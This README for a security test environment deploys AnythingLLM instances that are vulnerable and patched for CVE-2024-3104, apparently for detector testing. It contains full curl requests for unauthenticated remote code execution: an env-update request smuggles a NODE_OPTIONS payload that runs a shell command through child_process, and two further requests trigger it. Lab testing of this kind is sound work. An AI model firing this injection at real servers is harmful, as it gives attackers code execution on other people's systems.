# anything-llm CVE-2024-3104

This directory contains the deployment config for anything-llm instances vulnerable and fixed to CVE-2024-3104. Instances before the commit identified as bfedfebfab032e6f4d5a369c8a2f947c5d0c5286 may allow an unauthenticated user to enable escalation of privilege via remote access potentially.

## How to Trigger the Vulnerability?

To trigger the vulnerability, you can use the following three curl commands. In a vulnerable environment, after the final curl request, a file called rce will be created under the temp directory of the container.

```
# update env variables
curl -i -s -k -X $'POST' \
    -H $'Host: 127.0.0.1:3001' -H $'Content-Length: 175' -H $'sec-ch-ua: \"Chromium\";v=\"121\", \"Not A(Brand\";v=\"99\"' -H $'Content-Type: text/plain;charset=UTF-8' -H $'sec-ch-ua-mobile: ?0' -H $'Authorization: null' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36' -H $'sec-ch-ua-platform: \"Linux\"' -H $'Accept: */*' -H $'Origin: http://127.0.0.1:3001' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Dest: empty' -H $'Referer: http://127.0.0.1:3001/onboarding/llm-preference' -H $'Accept-Encoding: gzip, deflate, br' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: close' \
    --data-binary $'{\"LocalAiBasePath\":\"http://example.com/v1\'\\nNODE_OPTIONS=\'--import=\\\"data:text/javascript,import exec from \\\\\\\"node:child_process\\\\\\\";exec.execSync(\\\\\\\"touch /tmp/rce\\\\\\\")\\\"\"}' \
    $'http://127.0.0.1:3001/api/system/update-env'

# dump variables to env file
curl -i -s -k -X $'GET' \
    -H $'Host: 127.0.0.1:3001' -H $'Cache-Control: max-age=0' -H $'sec-ch-ua: \"Chromium\";v=\"121\", \"Not A(Brand\";v=\"99\"' -H $'sec-ch-ua-mobile: ?0' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36' -H $'sec-ch-ua-platform: \"Linux\"' -H $'Accept: */*' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Dest: empty' -H $'Referer: http://127.0.0.1:3001/' -H $'Accept-Encoding: gzip, deflate, br' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: close' \
    $'http://127.0.0.1:3001/api/env-dump'

# trigger rce
curl -i -s -k -X $'GET' \
    -H $'Host: 127.0.0.1:3001' -H $'Cache-Control: max-age=0' -H $'sec-ch-ua: \"Chromium\";v=\"121\", \"Not A(Brand\";v=\"99\"' -H $'sec-ch-ua-mobile: ?0' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36' -H $'sec-ch-ua-platform: \"Linux\"' -H $'Accept: */*' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Dest: empty' -H $'Referer: http://127.0.0.1:3001/' -H $'Accept-Encoding: gzip, deflate, br' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: close' \
    $'http://127.0.0.1:3001/api/migrate'
```

In case you cannot trigger the vulnerability, you might need to delete your existing container images because Docker might try to reuse them.

```
sudo docker rmi -f $(sudo docker images -aq)
sudo docker remove $(sudo docker ps -a -q)
```

## Vulnerable Setup

Since the official anything-llm Docker repository doesn't use a version system, and it overwrites Docker images with the latest updates every time, we need to clone the official repository and restore it to a state before the patch. Since the original vulnerability report uses the repository whose last commit ID is fde905aac1812b84066ff72e5f2f90b56d4c3a59, I will use it too.

I prepared a setup.sh bash script that does the following steps automatically:

- Cloning the official repository.
- Restoring the repository state to the specified commit ID.
- Copying required files (fixed Dockerfile, .env file etc.)
- Building and starting the Docker image.

```
./setup.sh
```

Application will be available at `localhost:3001` and anything-llm related files will be under the current directory.

## Non-vulnerable Setup

```
docker pull mintplexlabs/anythingllm
export STORAGE_LOCATION=$HOME/anythingllm && \
mkdir -p $STORAGE_LOCATION && \
touch "$STORAGE_LOCATION/.env" && \
docker run -d --network host \
--cap-add SYS_ADMIN \
-v ${STORAGE_LOCATION}:/app/server/storage \
-v ${STORAGE_LOCATION}/.env:/app/server/.env \
-e STORAGE_DIR="/app/server/storage" \
mintplexlabs/anythingllm
```

Application will be available at `localhost:3001` and anything-llm related files will be under the $HOME directory.
